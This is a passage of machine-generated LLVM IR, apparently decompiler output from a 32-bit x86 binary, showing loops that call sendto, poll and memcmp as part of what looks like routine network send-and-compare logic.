  %v0_804c924 = phi i32 [ %v0_804c8db172, %dec_label_pc_804c8db ], [ %v0_804c924.pre, %dec_label_pc_804c8e2 ]
  %v0_804c923 = phi i32 [ %v0_804c927174, %dec_label_pc_804c8db ], [ %v0_804c923.pre, %dec_label_pc_804c8e2 ]
  %v1_804c923 = add i32 %v0_804c923, 1
  store i32 %v1_804c923, i32* @edi, align 4
  %v1_804c924 = add i32 %v0_804c924, 28
  store i32 %v1_804c924, i32* @esi, align 4
  %v2_804c927 = add i32 %v1_804c927.pre, 36
  %v3_804c927 = inttoptr i32 %v2_804c927 to i32*
  %v4_804c927 = load i32, i32* %v3_804c927, align 4
  %v5_804c927 = sub i32 %v1_804c923, %v4_804c927
  %v11_804c927 = xor i32 %v4_804c927, %v1_804c923
  %v12_804c927 = xor i32 %v5_804c927, %v1_804c923
  %v13_804c927 = and i32 %v12_804c927, %v11_804c927
  %v14_804c927 = icmp slt i32 %v13_804c927, 0
  %v16_804c927 = icmp slt i32 %v5_804c927, 0
  %v2_804c92b = icmp eq i1 %v16_804c927, %v14_804c927
  br i1 %v2_804c92b, label %dec_label_pc_804c927.dec_label_pc_804c92d.loopexit_crit_edge, label %dec_label_pc_804c8db

dec_label_pc_804c927.dec_label_pc_804c92d.loopexit_crit_edge: ; preds = %dec_label_pc_804c923
  %v0_804c92d.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c92d

dec_label_pc_804c92d:                             ; preds = %dec_label_pc_804c8a0, %dec_label_pc_804c927.dec_label_pc_804c92d.loopexit_crit_edge, %dec_label_pc_804c86d
  %v1_804c92d = phi i32 [ %v1_804c894, %dec_label_pc_804c86d ], [ %v1_804c927.pre, %dec_label_pc_804c927.dec_label_pc_804c92d.loopexit_crit_edge ], [ %v1_804c8cf, %dec_label_pc_804c8a0 ]
  %v0_804c92d = phi i32 [ %v3_804c88f, %dec_label_pc_804c86d ], [ %v0_804c92d.pre.pre, %dec_label_pc_804c927.dec_label_pc_804c92d.loopexit_crit_edge ], [ %v0_804c8c3, %dec_label_pc_804c8a0 ]
  %v2_804c92d = add i32 %v1_804c92d, -4
  %v3_804c92d = inttoptr i32 %v2_804c92d to i32*
  store i32 %v0_804c92d, i32* %v3_804c92d, align 4
  %v1_804c92e = add i32 %v1_804c92d, 720
  %v2_804c92e = inttoptr i32 %v1_804c92e to i32*
  %v3_804c92e = load i32, i32* %v2_804c92e, align 4
  %v2_804c935 = mul i32 %v3_804c92e, 4
  store i32 %v2_804c935, i32* %eax.global-to-local, align 4
  %v2_804c938 = add i32 %v1_804c92d, -8
  %v3_804c938 = inttoptr i32 %v2_804c938 to i32*
  store i32 %v2_804c935, i32* %v3_804c938, align 4
  %v1_804c939 = add i32 %v1_804c92d, -12
  %v2_804c939 = inttoptr i32 %v1_804c939 to i32*
  store i32 0, i32* %v2_804c939, align 4
  %v1_804c93b = add i32 %v1_804c92d, 736
  %v2_804c93b = inttoptr i32 %v1_804c93b to i32*
  %v3_804c93b = load i32, i32* %v2_804c93b, align 4
  %v5_804c93b = add i32 %v1_804c92d, -16
  %v6_804c93b = inttoptr i32 %v5_804c93b to i32*
  store i32 %v3_804c93b, i32* %v6_804c93b, align 4
  %v4_804c942 = call i32 @memset(i8* inttoptr (i32 5000 to i8*), i32 2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c942, i32* %eax.global-to-local, align 4
  %v0_804c947 = load i32, i32* @esp, align 4
  %v1_804c947 = add i32 %v0_804c947, 32
  %v2_804c947 = inttoptr i32 %v1_804c947 to i32*
  %v3_804c947 = load i32, i32* %v2_804c947, align 4
  store i32 %v3_804c947, i32* %edx.global-to-local, align 4
  %v1_804c94b = add i32 %v0_804c947, 696
  %v2_804c94b = inttoptr i32 %v1_804c94b to i16*
  store i16 1, i16* %v2_804c94b, align 2
  %v0_804c955 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c955 = load i32, i32* @esp, align 4
  %v2_804c955 = add i32 %v1_804c955, 692
  %v3_804c955 = inttoptr i32 %v2_804c955 to i32*
  store i32 %v0_804c955, i32* %v3_804c955, align 4
  %v0_804c95c = call i32 @mtime()
  store i32 %v0_804c95c, i32* %eax.global-to-local, align 4
  %v0_804c961 = load i32, i32* @esp, align 4
  %v1_804c961 = add i32 %v0_804c961, 736
  %v2_804c961 = inttoptr i32 %v1_804c961 to i32*
  %v3_804c961 = load i32, i32* %v2_804c961, align 4
  store i32 %v3_804c961, i32* %ecx.global-to-local, align 4
  %v1_804c968 = add i32 %v0_804c961, 56
  %v2_804c968 = inttoptr i32 %v1_804c968 to i32*
  store i32 0, i32* %v2_804c968, align 4
  %v0_804c970 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c970 = mul i32 %v0_804c970, 2
  store i32 %v2_804c970, i32* @ecx, align 4
  %v1_804c972 = load i32, i32* @esp, align 4
  %v2_804c972 = add i32 %v1_804c972, 64
  %v3_804c972 = inttoptr i32 %v2_804c972 to i32*
  store i32 %v2_804c970, i32* %v3_804c972, align 4
  %v1_804c976 = load i32, i32* @esp, align 4
  %v2_804c976 = add i32 %v1_804c976, 68
  %v3_804c976 = inttoptr i32 %v2_804c976 to i32*
  store i32 %v0_804c95c, i32* %v3_804c976, align 4
  %v0_804c97a = load i32, i32* @esp, align 4
  %v1_804c97a = add i32 %v0_804c97a, 36
  %v2_804c97a = inttoptr i32 %v1_804c97a to i32*
  %v3_804c97a = load i32, i32* %v2_804c97a, align 4
  store i32 %v3_804c97a, i32* %eax.global-to-local, align 4
  %v1_804c97e = add i32 %v0_804c97a, 68
  %v2_804c97e = inttoptr i32 %v1_804c97e to i32*
  %v3_804c97e = load i32, i32* %v2_804c97e, align 4
  store i32 %v3_804c97e, i32* @ebx, align 4
  %v1_804c982 = ashr i32 %v3_804c97a, 31
  store i32 %v1_804c982, i32* %edx.global-to-local, align 4
  %v1_804c983 = add i32 %v0_804c97a, 40
  %v2_804c983 = inttoptr i32 %v1_804c983 to i32*
  %v3_804c983 = load i32, i32* %v2_804c983, align 4
  %v5_804c983 = zext i32 %v3_804c97a to i64
  %v7_804c983 = zext i32 %v1_804c982 to i64
  %v8_804c983 = mul nuw i64 %v7_804c983, 4294967296
  %v9_804c983 = or i64 %v8_804c983, %v5_804c983
  %v10_804c983 = zext i32 %v3_804c983 to i64
  %v11_804c983 = sdiv i64 %v9_804c983, %v10_804c983
  %v12_804c983 = trunc i64 %v11_804c983 to i32
  store i32 %v12_804c983, i32* %eax.global-to-local, align 4
  %v13_804c983 = srem i64 %v9_804c983, %v10_804c983
  %v14_804c983 = trunc i64 %v13_804c983 to i32
  store i32 %v14_804c983, i32* %edx.global-to-local, align 4
  %v3_804c987 = load i32, i32* %v2_804c97e, align 4
  %v2_804c98b = sub i32 %v3_804c987, %v12_804c983
  store i32 %v2_804c98b, i32* %edx.global-to-local, align 4
  %v2_804c98d = add i32 %v0_804c97a, 28
  %v3_804c98d = inttoptr i32 %v2_804c98d to i32*
  store i32 %v12_804c983, i32* %v3_804c98d, align 4
  %v0_804c991 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c991 = load i32, i32* @esp, align 4
  %v2_804c991 = add i32 %v1_804c991, 60
  %v3_804c991 = inttoptr i32 %v2_804c991 to i32*
  store i32 %v0_804c991, i32* %v3_804c991, align 4
  %v0_804c995 = load i32, i32* @esp, align 4
  %v1_804c995 = add i32 %v0_804c995, 16
  %v0_804cbfd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cbfd

dec_label_pc_804c99d:                             ; preds = %dec_label_pc_804cbfd
  store i32 %v0_804c99d, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v2_804c9a1 = add i32 %v1_804c9a5, 44
  %v3_804c9a1 = inttoptr i32 %v2_804c9a1 to i32*
  %v4_804c9a1 = load i32, i32* %v3_804c9a1, align 4
  %v5_804c9a1 = sub i32 %v0_804c99d, %v4_804c9a1
  store i32 %v5_804c9a1, i32* %eax.global-to-local, align 4
  %v2_804c9a5 = add i32 %v1_804c9a5, 12
  %v3_804c9a5 = inttoptr i32 %v2_804c9a5 to i32*
  %v4_804c9a5 = load i32, i32* %v3_804c9a5, align 4
  %v10_804c9a5 = icmp ult i32 %v5_804c9a1, %v4_804c9a5
  %v1_804c9a9 = icmp eq i1 %v10_804c9a5, false
  br i1 %v1_804c9a9, label %dec_label_pc_804c9ff.preheader, label %dec_label_pc_804ca14

dec_label_pc_804c9ff.preheader:                   ; preds = %dec_label_pc_804c99d
  %v2_804c9ff103 = add i32 %v1_804c9a5, 720
  %v3_804c9ff104 = inttoptr i32 %v2_804c9ff103 to i32*
  %v4_804c9ff105 = load i32, i32* %v3_804c9ff104, align 4
  %v5_804c9ff106 = sub i32 0, %v4_804c9ff105
  %v13_804c9ff110 = and i32 %v4_804c9ff105, %v5_804c9ff106
  %v14_804c9ff111 = icmp slt i32 %v13_804c9ff110, 0
  %v16_804c9ff113 = icmp slt i32 %v5_804c9ff106, 0
  %v2_804ca06114 = icmp eq i1 %v16_804c9ff113, %v14_804c9ff111
  br i1 %v2_804ca06114, label %dec_label_pc_804ca08, label %dec_label_pc_804c9ad

dec_label_pc_804c9ad:                             ; preds = %dec_label_pc_804c9ff.preheader, %dec_label_pc_804c9fe
  %v1_804c9b6116 = phi i32 [ %v1_804c9fe, %dec_label_pc_804c9fe ], [ 0, %dec_label_pc_804c9ff.preheader ]
  %v0_804ca08115 = phi i32 [ %v1_804c9ff32, %dec_label_pc_804c9fe ], [ %v1_804c9a5, %dec_label_pc_804c9ff.preheader ]
  %v1_804c9ad = add i32 %v0_804ca08115, 736
  %v2_804c9ad = inttoptr i32 %v1_804c9ad to i32*
  %v3_804c9ad = load i32, i32* %v2_804c9ad, align 4
  store i32 %v3_804c9ad, i32* %eax.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v2_804c9b6 = mul i32 %v1_804c9b6116, 4
  %v3_804c9b6 = add i32 %v3_804c9ad, %v2_804c9b6
  %v4_804c9b6 = inttoptr i32 %v3_804c9b6 to i32*
  %v5_804c9b6 = load i32, i32* %v4_804c9b6, align 4
  %v6_804c9b6 = icmp eq i32 %v5_804c9b6, 0
  br i1 %v6_804c9b6, label %dec_label_pc_804c9f8.preheader, label %dec_label_pc_804c9fe

dec_label_pc_804c9f8.preheader:                   ; preds = %dec_label_pc_804c9ad
  %v2_804c9f889 = add i32 %v0_804ca08115, 36
  %v3_804c9f890 = inttoptr i32 %v2_804c9f889 to i32*
  %v4_804c9f891 = load i32, i32* %v3_804c9f890, align 4
  %v5_804c9f892 = sub i32 0, %v4_804c9f891
  %v13_804c9f896 = and i32 %v4_804c9f891, %v5_804c9f892
  %v14_804c9f897 = icmp slt i32 %v13_804c9f896, 0
  %v16_804c9f899 = icmp slt i32 %v5_804c9f892, 0
  %v2_804c9fc100 = icmp eq i1 %v16_804c9f899, %v14_804c9f897
  br i1 %v2_804c9fc100, label %dec_label_pc_804c9fe, label %dec_label_pc_804c9be

dec_label_pc_804c9be:                             ; preds = %dec_label_pc_804c9f8.preheader, %dec_label_pc_804c9be
  %v1_804c9be102 = phi i32 [ %v1_804c9f5, %dec_label_pc_804c9be ], [ %v0_804ca08115, %dec_label_pc_804c9f8.preheader ]
  %v0_804c9be101 = phi i32 [ %v6_804c9f0, %dec_label_pc_804c9be ], [ %v3_804c9ad, %dec_label_pc_804c9f8.preheader ]
  %v2_804c9be = add i32 %v1_804c9be102, -4
  %v3_804c9be = inttoptr i32 %v2_804c9be to i32*
  store i32 %v0_804c9be101, i32* %v3_804c9be, align 4
  %v0_804c9bf = load i32, i32* %eax.global-to-local, align 4
  %v2_804c9bf = add i32 %v1_804c9be102, -8
  %v3_804c9bf = inttoptr i32 %v2_804c9bf to i32*
  store i32 %v0_804c9bf, i32* %v3_804c9bf, align 4
  %v1_804c9c0 = add i32 %v1_804c9be102, 32
  %v2_804c9c0 = inttoptr i32 %v1_804c9c0 to i32*
  %v3_804c9c0 = load i32, i32* %v2_804c9c0, align 4
  %v5_804c9c0 = add i32 %v1_804c9be102, -12
  %v6_804c9c0 = inttoptr i32 %v5_804c9c0 to i32*
  store i32 %v3_804c9c0, i32* %v6_804c9c0, align 4
  %v1_804c9c4 = load i32, i32* @esi, align 4
  %v3_804c9c4 = mul i32 %v1_804c9c4, 28
  %v1_804c9c7 = add i32 %v1_804c9c4, 1
  store i32 %v1_804c9c7, i32* @esi, align 4
  %v1_804c9c8 = add i32 %v1_804c9be102, 460
  store i32 %v1_804c9c8, i32* %edx.global-to-local, align 4
  %v2_804c9cf = add i32 %v3_804c9c4, %v1_804c9c8
  store i32 %v2_804c9cf, i32* %eax.global-to-local, align 4
  %v2_804c9d2 = add i32 %v1_804c9be102, -16
  %v3_804c9d2 = inttoptr i32 %v2_804c9d2 to i32*
  store i32 %v2_804c9cf, i32* %v3_804c9d2, align 4
  %v1_804c9d3 = add i32 %v1_804c9be102, -20
  %v2_804c9d3 = inttoptr i32 %v1_804c9d3 to i32*
  store i32 16384, i32* %v2_804c9d3, align 4
  %v1_804c9d8 = add i32 %v1_804c9be102, 728
  %v2_804c9d8 = inttoptr i32 %v1_804c9d8 to i32*
  %v3_804c9d8 = load i32, i32* %v2_804c9d8, align 4
  store i32 %v3_804c9d8, i32* %ecx.global-to-local, align 4
  %v1_804c9df = load i32, i32* @edi, align 4
  %v2_804c9df = mul i32 %v1_804c9df, 4
  %v3_804c9df = add i32 %v2_804c9df, %v3_804c9d8
  %v4_804c9df = inttoptr i32 %v3_804c9df to i32*
  %v5_804c9df = load i32, i32* %v4_804c9df, align 4
  %v7_804c9df = add i32 %v1_804c9be102, -24
  %v8_804c9df = inttoptr i32 %v7_804c9df to i32*
  store i32 %v5_804c9df, i32* %v8_804c9df, align 4
  %v1_804c9e2 = add i32 %v1_804c9be102, 724
  %v2_804c9e2 = inttoptr i32 %v1_804c9e2 to i32*
  %v3_804c9e2 = load i32, i32* %v2_804c9e2, align 4
  store i32 %v3_804c9e2, i32* %eax.global-to-local, align 4
  %v1_804c9e9 = load i32, i32* @edi, align 4
  %v2_804c9e9 = mul i32 %v1_804c9e9, 4
  %v3_804c9e9 = add i32 %v2_804c9e9, %v3_804c9e2
  %v4_804c9e9 = inttoptr i32 %v3_804c9e9 to i32*
  %v5_804c9e9 = load i32, i32* %v4_804c9e9, align 4
  %v7_804c9e9 = add i32 %v1_804c9be102, -28
  %v8_804c9e9 = inttoptr i32 %v7_804c9e9 to i32*
  store i32 %v5_804c9e9, i32* %v8_804c9e9, align 4
  %v1_804c9ec = add i32 %v1_804c9be102, 16
  %v2_804c9ec = inttoptr i32 %v1_804c9ec to i32*
  %v3_804c9ec = load i32, i32* %v2_804c9ec, align 4
  %v5_804c9ec = add i32 %v1_804c9be102, -32
  %v6_804c9ec = inttoptr i32 %v5_804c9ec to i32*
  store i32 %v3_804c9ec, i32* %v6_804c9ec, align 4
  %v6_804c9f0 = call i32 @sendto(i32 5000, i32 2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804c9f0, i32* %eax.global-to-local, align 4
  %v0_804c9f5 = load i32, i32* @esp, align 4
  %v1_804c9f5 = add i32 %v0_804c9f5, 32
  %v0_804c9f8.pre = load i32, i32* @esi, align 4
  %v2_804c9f8 = add i32 %v0_804c9f5, 68
  %v3_804c9f8 = inttoptr i32 %v2_804c9f8 to i32*
  %v4_804c9f8 = load i32, i32* %v3_804c9f8, align 4
  %v5_804c9f8 = sub i32 %v0_804c9f8.pre, %v4_804c9f8
  %v11_804c9f8 = xor i32 %v4_804c9f8, %v0_804c9f8.pre
  %v12_804c9f8 = xor i32 %v5_804c9f8, %v0_804c9f8.pre
  %v13_804c9f8 = and i32 %v12_804c9f8, %v11_804c9f8
  %v14_804c9f8 = icmp slt i32 %v13_804c9f8, 0
  %v16_804c9f8 = icmp slt i32 %v5_804c9f8, 0
  %v2_804c9fc = icmp eq i1 %v16_804c9f8, %v14_804c9f8
  br i1 %v2_804c9fc, label %dec_label_pc_804c9f8.dec_label_pc_804c9fe.loopexit_crit_edge, label %dec_label_pc_804c9be

dec_label_pc_804c9f8.dec_label_pc_804c9fe.loopexit_crit_edge: ; preds = %dec_label_pc_804c9be
  %v0_804c9fe.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c9fe

dec_label_pc_804c9fe:                             ; preds = %dec_label_pc_804c9f8.preheader, %dec_label_pc_804c9f8.dec_label_pc_804c9fe.loopexit_crit_edge, %dec_label_pc_804c9ad
  %v0_804c9fe = phi i32 [ %v1_804c9b6116, %dec_label_pc_804c9ad ], [ %v0_804c9fe.pre.pre, %dec_label_pc_804c9f8.dec_label_pc_804c9fe.loopexit_crit_edge ], [ %v1_804c9b6116, %dec_label_pc_804c9f8.preheader ]
  %v1_804c9ff32 = phi i32 [ %v0_804ca08115, %dec_label_pc_804c9ad ], [ %v1_804c9f5, %dec_label_pc_804c9f8.dec_label_pc_804c9fe.loopexit_crit_edge ], [ %v0_804ca08115, %dec_label_pc_804c9f8.preheader ]
  %v1_804c9fe = add i32 %v0_804c9fe, 1
  store i32 %v1_804c9fe, i32* @edi, align 4
  %v2_804c9ff = add i32 %v1_804c9ff32, 720
  %v3_804c9ff = inttoptr i32 %v2_804c9ff to i32*
  %v4_804c9ff = load i32, i32* %v3_804c9ff, align 4
  %v5_804c9ff = sub i32 %v1_804c9fe, %v4_804c9ff
  %v11_804c9ff = xor i32 %v4_804c9ff, %v1_804c9fe
  %v12_804c9ff = xor i32 %v5_804c9ff, %v1_804c9fe
  %v13_804c9ff = and i32 %v12_804c9ff, %v11_804c9ff
  %v14_804c9ff = icmp slt i32 %v13_804c9ff, 0
  %v16_804c9ff = icmp slt i32 %v5_804c9ff, 0
  %v2_804ca06 = icmp eq i1 %v16_804c9ff, %v14_804c9ff
  br i1 %v2_804ca06, label %dec_label_pc_804c9ff.dec_label_pc_804ca08_crit_edge, label %dec_label_pc_804c9ad

dec_label_pc_804c9ff.dec_label_pc_804ca08_crit_edge: ; preds = %dec_label_pc_804c9fe
  %v0_804ca0c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ca08

dec_label_pc_804ca08:                             ; preds = %dec_label_pc_804c9ff.dec_label_pc_804ca08_crit_edge, %dec_label_pc_804c9ff.preheader
  %v0_804ca0c = phi i32 [ %v0_804ca0c.pre, %dec_label_pc_804c9ff.dec_label_pc_804ca08_crit_edge ], [ %v0_804c99d, %dec_label_pc_804c9ff.preheader ]
  %v0_804ca08.lcssa = phi i32 [ %v1_804c9ff32, %dec_label_pc_804c9ff.dec_label_pc_804ca08_crit_edge ], [ %v1_804c9a5, %dec_label_pc_804c9ff.preheader ]
  %v1_804ca08 = add i32 %v0_804ca08.lcssa, 48
  %v2_804ca08 = inttoptr i32 %v1_804ca08 to i32*
  %v3_804ca08 = load i32, i32* %v2_804ca08, align 4
  store i32 %v3_804ca08, i32* %edx.global-to-local, align 4
  %v2_804ca0c = add i32 %v0_804ca08.lcssa, 44
  %v3_804ca0c = inttoptr i32 %v2_804ca0c to i32*
  store i32 %v0_804ca0c, i32* %v3_804ca0c, align 4
  %v0_804ca10 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ca10 = load i32, i32* @esp, align 4
  %v2_804ca10 = add i32 %v1_804ca10, 28
  %v3_804ca10 = inttoptr i32 %v2_804ca10 to i32*
  store i32 %v0_804ca10, i32* %v3_804ca10, align 4
  %v0_804ca14.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca14.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ca14

dec_label_pc_804ca14:                             ; preds = %dec_label_pc_804c99d, %dec_label_pc_804ca08
  %v1_804ca14 = phi i32 [ %v1_804c9a5, %dec_label_pc_804c99d ], [ %v1_804ca14.pre, %dec_label_pc_804ca08 ]
  %v0_804ca14 = phi i32 [ %v5_804c9a1, %dec_label_pc_804c99d ], [ %v0_804ca14.pre, %dec_label_pc_804ca08 ]
  %v2_804ca14 = add i32 %v1_804ca14, -4
  %v3_804ca14 = inttoptr i32 %v2_804ca14 to i32*
  store i32 %v0_804ca14, i32* %v3_804ca14, align 4
  %v1_804ca15 = add i32 %v1_804ca14, 12
  %v2_804ca15 = inttoptr i32 %v1_804ca15 to i32*
  %v3_804ca15 = load i32, i32* %v2_804ca15, align 4
  %v1_804ca19 = load i32, i32* @ebx, align 4
  %v2_804ca19 = sub i32 %v3_804ca15, %v1_804ca19
  store i32 %v2_804ca19, i32* %eax.global-to-local, align 4
  %v2_804ca1b = add i32 %v1_804ca14, 44
  %v3_804ca1b = inttoptr i32 %v2_804ca1b to i32*
  %v4_804ca1b = load i32, i32* %v3_804ca1b, align 4
  %v5_804ca1b = add i32 %v4_804ca1b, %v2_804ca19
  store i32 %v5_804ca1b, i32* %eax.global-to-local, align 4
  %v2_804ca1f = add i32 %v1_804ca14, -8
  %v3_804ca1f = inttoptr i32 %v2_804ca1f to i32*
  store i32 %v5_804ca1b, i32* %v3_804ca1f, align 4
  %v1_804ca20 = add i32 %v1_804ca14, -12
  %v2_804ca20 = inttoptr i32 %v1_804ca20 to i32*
  store i32 1, i32* %v2_804ca20, align 4
  %v1_804ca22 = add i32 %v1_804ca14, 676
  store i32 %v1_804ca22, i32* %ecx.global-to-local, align 4
  %v2_804ca29 = add i32 %v1_804ca14, -16
  %v3_804ca29 = inttoptr i32 %v2_804ca29 to i32*
  store i32 %v1_804ca22, i32* %v3_804ca29, align 4
  %v0_804ca2a = call i32 @poll()
  store i32 %v0_804ca2a, i32* %eax.global-to-local, align 4
  %v0_804ca2f = load i32, i32* @esp, align 4
  %v1_804ca2f = add i32 %v0_804ca2f, 16
  %tmp80 = icmp slt i32 %v0_804ca2a, 1
  %tmp81 = icmp eq i1 %tmp80, false
  br i1 %tmp81, label %dec_label_pc_804cba7, label %dec_label_pc_804cbf6

dec_label_pc_804ca3f:                             ; preds = %dec_label_pc_804cba7
  %v1_804cbe9 = add i32 %v0_804cbe9, 32
  %v7_804ca42 = icmp sgt i32 %v6_804cbe4, 3
  br i1 %v7_804ca42, label %dec_label_pc_804ca48, label %dec_label_pc_804cba7

dec_label_pc_804ca48:                             ; preds = %dec_label_pc_804ca3f
  %v1_804ca48 = add i32 %v0_804cbe9, 492
  store i32 %v1_804ca48, i32* @ebx, align 4
  %v1_804ca4f = add i32 %v0_804cbe9, 88
  %v2_804ca4f = inttoptr i32 %v1_804ca4f to i32*
  store i32 0, i32* %v2_804ca4f, align 4
  br label %dec_label_pc_804ca5d

dec_label_pc_804ca59:                             ; preds = %dec_label_pc_804ca67
  %v1_804ca59 = add i32 %v0_804ca7d, 72
  %v2_804ca59 = inttoptr i32 %v1_804ca59 to i32*
  %v3_804ca59 = load i32, i32* %v2_804ca59, align 4
  %v4_804ca59 = add i32 %v3_804ca59, 1
  store i32 %v4_804ca59, i32* %v2_804ca59, align 4
  br label %dec_label_pc_804ca5d

dec_label_pc_804ca5d:                             ; preds = %dec_label_pc_804ca48, %dec_label_pc_804ca59
  %v0_804ca5d = load i32, i32* @esp, align 4
  %v1_804ca5d = add i32 %v0_804ca5d, 36
  %v2_804ca5d = inttoptr i32 %v1_804ca5d to i32*
  %v3_804ca5d = load i32, i32* %v2_804ca5d, align 4
  store i32 %v3_804ca5d, i32* %eax.global-to-local, align 4
  %v1_804ca61 = add i32 %v0_804ca5d, 56
  %v2_804ca61 = inttoptr i32 %v1_804ca61 to i32*
  %v3_804ca61 = load i32, i32* %v2_804ca61, align 4
  %v5_804ca61 = sub i32 %v3_804ca61, %v3_804ca5d
  %v11_804ca61 = xor i32 %v3_804ca61, %v3_804ca5d
  %v12_804ca61 = xor i32 %v5_804ca61, %v3_804ca61
  %v13_804ca61 = and i32 %v12_804ca61, %v11_804ca61
  %v14_804ca61 = icmp slt i32 %v13_804ca61, 0
  %v16_804ca61 = icmp slt i32 %v5_804ca61, 0
  %v2_804ca65 = icmp eq i1 %v16_804ca61, %v14_804ca61
  br i1 %v2_804ca65, label %dec_label_pc_804ca84, label %dec_label_pc_804ca67

dec_label_pc_804ca67:                             ; preds = %dec_label_pc_804ca5d
  %v2_804ca67 = add i32 %v0_804ca5d, -4
  %v3_804ca67 = inttoptr i32 %v2_804ca67 to i32*
  store i32 %v3_804ca5d, i32* %v3_804ca67, align 4
  %v1_804ca68 = add i32 %v0_804ca5d, 32
  %v2_804ca68 = inttoptr i32 %v1_804ca68 to i32*
  %v3_804ca68 = load i32, i32* %v2_804ca68, align 4
  %v5_804ca68 = add i32 %v0_804ca5d, -8
  %v6_804ca68 = inttoptr i32 %v5_804ca68 to i32*
  store i32 %v3_804ca68, i32* %v6_804ca68, align 4
  %v1_804ca6c = add i32 %v0_804ca5d, 636
  store i32 %v1_804ca6c, i32* %edx.global-to-local, align 4
  %v2_804ca73 = add i32 %v0_804ca5d, -12
  %v3_804ca73 = inttoptr i32 %v2_804ca73 to i32*
  store i32 %v1_804ca6c, i32* %v3_804ca73, align 4
  %v0_804ca74 = load i32, i32* @ebx, align 4
  %v2_804ca74 = add i32 %v0_804ca5d, -16
  %v3_804ca74 = inttoptr i32 %v2_804ca74 to i32*
  store i32 %v0_804ca74, i32* %v3_804ca74, align 4
  %v0_804ca75 = load i32, i32* @ebx, align 4
  %v1_804ca75 = add i32 %v0_804ca75, 28
  store i32 %v1_804ca75, i32* @ebx, align 4
  %v4_804ca78 = call i32 @memcmp(i8* inttoptr (i32 5000 to i8*), i32 2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ca78, i32* %eax.global-to-local, align 4
  %v0_804ca7d = load i32, i32* @esp, align 4
  %v1_804ca7d = add i32 %v0_804ca7d, 16
  %v1_804ca80 = icmp eq i32 %v4_804ca78, 0
  %v1_804ca82 = icmp eq i1 %v1_804ca80, false
  br i1 %v1_804ca82, label %dec_label_pc_804ca59, label %dec_label_pc_804ca84

dec_label_pc_804ca84:                             ; preds = %dec_label_pc_804ca67, %dec_label_pc_804ca5d
  %v4_804cab350 = phi i32 [ %v4_804ca78, %dec_label_pc_804ca67 ], [ %v3_804ca5d, %dec_label_pc_804ca5d ]
  %v17_804cb0a = phi i32 [ %v1_804ca7d, %dec_label_pc_804ca67 ], [ %v0_804ca5d, %dec_label_pc_804ca5d ]
  %v1_804ca84 = add i32 %v17_804cb0a, 36
  %v2_804ca84 = inttoptr i32 %v1_804ca84 to i32*
  %v3_804ca84 = load i32, i32* %v2_804ca84, align 4
  store i32 %v3_804ca84, i32* %ecx.global-to-local, align 4
  %v1_804ca88 = add i32 %v17_804cb0a, 56
  %v2_804ca88 = inttoptr i32 %v1_804ca88 to i32*
  %v3_804ca88 = load i32, i32* %v2_804ca88, align 4
  %v15_804ca88 = icmp eq i32 %v3_804ca88, %v3_804ca84
  br i1 %v15_804ca88, label %dec_label_pc_804cba7, label %dec_label_pc_804ca92

dec_label_pc_804ca92:                             ; preds = %dec_label_pc_804ca84
  %v1_804ca92 = add i32 %v17_804cb0a, 724
  %v2_804ca92 = inttoptr i32 %v1_804ca92 to i32*
  %v3_804ca92 = load i32, i32* %v2_804ca92, align 4
  %v1_804ca99 = load i32, i32* @edi, align 4
  %v2_804ca99 = add i32 %v1_804ca99, %v3_804ca92
  store i32 %v2_804ca99, i32* @ebx, align 4
  %v1_804ca9b = add i32 %v17_804cb0a, 40
  %v2_804ca9b = inttoptr i32 %v1_804ca9b to i32*
  %v3_804ca9b = load i32, i32* %v2_804ca9b, align 4
  store i32 %v3_804ca9b, i32* @edi, align 4
  %v2_804caa5 = add i32 %v17_804cb0a, 720
  %v3_804caa5 = inttoptr i32 %v2_804caa5 to i32*
  %v4_804caa5118 = load i32, i32* %v3_804caa5, align 4
  %v5_804caa5119 = sub i32 %v3_804ca9b, %v4_804caa5118
  %v11_804caa5121 = xor i32 %v4_804caa5118, %v3_804ca9b
  %v12_804caa5122 = xor i32 %v5_804caa5119, %v3_804ca9b
  %v13_804caa5123 = and i32 %v12_804caa5122, %v11_804caa5121
  %v14_804caa5124 = icmp slt i32 %v13_804caa5123, 0
  %v16_804caa5126 = icmp slt i32 %v5_804caa5119, 0
  %v2_804caac127 = icmp eq i1 %v16_804caa5126, %v14_804caa5124
  br i1 %v2_804caac127, label %dec_label_pc_804cac3, label %dec_label_pc_804caae.lr.ph

dec_label_pc_804caae.lr.ph:                       ; preds = %dec_label_pc_804ca92
  %v0_804caae.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804caae

dec_label_pc_804caa1:                             ; preds = %dec_label_pc_804cab9, %dec_label_pc_804caae
  %v4_804cab349 = phi i32 [ %v7_804cab9, %dec_label_pc_804cab9 ], [ %v6_804cab3, %dec_label_pc_804caae ]
  %v1_804caa1 = add i32 %v0_804cb56130, 1
  store i32 %v1_804caa1, i32* @edi, align 4
  %v1_804caa2 = add i32 %v0_804caa2129, 4
  store i32 %v1_804caa2, i32* @ebx, align 4
  %v4_804caa5 = load i32, i32* %v3_804caa5, align 4
  %v5_804caa5 = sub i32 %v1_804caa1, %v4_804caa5
  %v11_804caa5 = xor i32 %v4_804caa5, %v1_804caa1
  %v12_804caa5 = xor i32 %v5_804caa5, %v1_804caa1
  %v13_804caa5 = and i32 %v12_804caa5, %v11_804caa5
  %v14_804caa5 = icmp slt i32 %v13_804caa5, 0
  %v16_804caa5 = icmp slt i32 %v5_804caa5, 0
  %v2_804caac = icmp eq i1 %v16_804caa5, %v14_804caa5
  br i1 %v2_804caac, label %dec_label_pc_804cac3, label %dec_label_pc_804caae

dec_label_pc_804caae:                             ; preds = %dec_label_pc_804caae.lr.ph, %dec_label_pc_804caa1
